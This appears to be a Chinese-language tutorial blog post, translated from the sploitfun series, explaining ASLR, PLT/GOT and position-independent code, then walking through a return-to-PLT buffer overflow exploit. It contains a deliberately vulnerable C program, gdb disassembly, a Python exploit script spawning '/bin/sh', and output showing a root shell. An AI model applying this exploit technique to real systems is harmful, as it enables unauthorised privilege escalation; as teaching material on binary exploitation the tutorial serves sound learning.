---
layout: post
title: 通过return to plt绕过ASLR
excerpt: "sploitfun系列教程之2.3.1 return_to_plt"
categories: [sploitfun系列教程]
comments: true
---

#### 什么是ASLR
Address space layout randomization (ASLR)是一种地址随机化的技术，随机化的空间包括
- 栈地址
- 堆地址
- 共享库地址

**没有运行程序的基地址**

在以前的文章中，libc中函数地址计算方法如下
```
libc function address = libc base address + function offset
```
其中
- 当地址随机化关闭，libc的基地址通常是`0xb7e22000`
- offset通过`readelf -s libc.so.6 | grep`来查看

现在我们把地址随机化开启
```
echo 2 > /proc/sys/kernel/randomize_va_space
```
现在libc基地址将会被随机化

#### 什么是return to plt
相比与return to libc ，这种技术是将function@PLT的地址覆盖到return address中(这个地址不是随机的，是程序运行前就知道的)

为了更好的了解Procedural Linkage Table (PLT)，首先让我介绍一下共享库

与静态库不同，共享库代码段在多个进程之间共享，而其数据段对于每个进程是唯一的。这有助于减少内存和磁盘空间。由于代码段在多个进程之间共享，所以应该只有read和execute权限，因此动态链接器不能重新定位代码段中存在的数据符号或函数地址（因为它没有写权限）。那么动态链接如何在运行时重新定位共享库符号而不修改其代码段?它使用PIC完成！

#### 什么是plc
Position Independent Code (PIC) 是为了解决这个问题而开发的 - 它确保共享库代码段在多个进程之间共享，尽管在加载时执行重定位。PIC通过一级间接寻址实现这一点-共享库代码段不包含绝对虚拟地址来代替全局符号和函数引用，而是指向数据段中的特定表。该表是全局符号和函数绝对虚拟地址的占位符。动态链接器作为重定位的一部分来填充此表。因此，只有重定位数据段被修改，代码段保持不变！

一个例子
```c
//eg.c
//$gcc -g -o eg eg.c
#include <stdio.h>

int main(int argc, char* argv[]) {
 printf("Hello %s\n", argv[1]);
 return 0;
}
```
编译
```shell
gcc -g -o eg eg.c -m32
```
下面的反汇编显示，我们不会直接调用'printf'，而是调用相应的PLT代码'printf@PLT'。
```bash
gdb-peda$ disassemble main
Dump of assembler code for function main:
   0x0804840d <+0>:	push   ebp
   0x0804840e <+1>:	mov    ebp,esp
   0x08048410 <+3>:	and    esp,0xfffffff0
   0x08048413 <+6>:	sub    esp,0x10
   0x08048416 <+9>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048419 <+12>:	add    eax,0x4
   0x0804841c <+15>:	mov    eax,DWORD PTR [eax]
   0x0804841e <+17>:	mov    DWORD PTR [esp+0x4],eax
   0x08048422 <+21>:	mov    DWORD PTR [esp],0x80484d4
   0x08048429 <+28>:	call   0x80482e0 <printf@plt>
   0x0804842e <+33>:	mov    eax,0x0
   0x08048433 <+38>:	leave  
   0x08048434 <+39>:	ret    
End of assembler dump.
```
```bash
gdb-peda$ disassemble 0x80482e0
Dump of assembler code for function printf@plt:
   0x080482e0 <+0>:	jmp    DWORD PTR ds:0x804a00c
   0x080482e6 <+6>:	push   0x0
   0x080482eb <+11>:	jmp    0x80482d0
End of assembler dump.
```shell
在第一次调用printf之前，GOT entry (0x804a00c)指向了第二行，最终在dynamic linker帮助下完成链接
```
gdb-peda$ x/wx 0x804a00c
0x804a00c:	0x080482e6
```
在printf方法调用之后，其相应的GOT条目包含printf函数地址(如下所示)
```shell
gdb-peda$ x/wx 0x804a00c
0x804a00c:	0xf7e505d0
gdb-peda$ disassemble 0xf7e505d0
Dump of assembler code for function printf:
   0xf7e505d0 <+0>:	push   ebx
   0xf7e505d1 <+1>:	sub    esp,0x18
   0xf7e505d4 <+4>:	call   0xf7f436c5 <__x86.get_pc_thunk.bx>
   0xf7e505d9 <+9>:	add    ebx,0x178a27
   0xf7e505df <+15>:	lea    eax,[esp+0x24]
   0xf7e505e3 <+19>:	mov    DWORD PTR [esp+0x8],eax
   0xf7e505e7 <+23>:	mov    eax,DWORD PTR [esp+0x20]
   0xf7e505eb <+27>:	mov    DWORD PTR [esp+0x4],eax
   0xf7e505ef <+31>:	mov    eax,DWORD PTR [ebx-0x74]
   0xf7e505f5 <+37>:	mov    eax,DWORD PTR [eax]
   0xf7e505f7 <+39>:	mov    DWORD PTR [esp],eax
   0xf7e505fa <+42>:	call   0xf7e46520 <vfprintf>
   0xf7e505ff <+47>:	add    esp,0x18
   0xf7e50602 <+50>:	pop    ebx
   0xf7e50603 <+51>:	ret    
End of assembler dump.
```
了解了这些之后，我们使用return to plt来绕过aslr

漏洞代码
```c
#include <stdio.h>
#include <string.h>

/* Eventhough shell() function isnt invoked directly, its needed here since 'system@PLT' and 'exit@PLT' stub code should be present in executable to successfully exploit it. */
void shell() {
 system("/bin/sh");
 exit(0);
}

int main(int argc, char* argv[]) {
 int i=0;
 char buf[256];
 strcpy(buf,argv[1]);
 printf("%s\n",buf);
 return 0;
}
```
编译
```c
echo 2 > /proc/sys/kernel/randomize_va_space
gcc -g -fno-stack-protector -o vuln vuln.c -m32
chmod 777 vuln
```
使用`objdump -d vuln | less`查找`system@PLT`和`exit@PLT`，或者使用如下方法
```shell
gdb-peda$ disassemble shell
Dump of assembler code for function shell:
   0x0804849d <+0>:	push   ebp
   0x0804849e <+1>:	mov    ebp,esp
   0x080484a0 <+3>:	sub    esp,0x18
   0x080484a3 <+6>:	mov    DWORD PTR [esp],0x8048594
   0x080484aa <+13>:	call   0x8048360 <system@plt>
   0x080484af <+18>:	mov    DWORD PTR [esp],0x0
   0x080484b6 <+25>:	call   0x8048370 <exit@plt>
End of assembler dump.
```
通过这些plt的值，我们来绕过aslr
```python
#exp.py
#!/usr/bin/env python
import struct
from subprocess import call

system = 0x8048360
exit = 0x8048370
system_arg = 0x8048599     #Obtained from  ```objdump -s vuln|less```

#endianess convertion
def conv(num):
 return struct.pack("<I",num)

# Junk + system + exit + system_arg
buf = "A" * 272
buf += conv(system)
buf += conv(exit)
buf += conv(system_arg)

print "Calling vulnerable program"
call(["./vuln", buf])
```
最后的结果
```shell
python exp.py 
Calling vulnerable program
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA檯 
sh-4.2# id
uid=0(root) gid=0(root) 组=0(root)
```



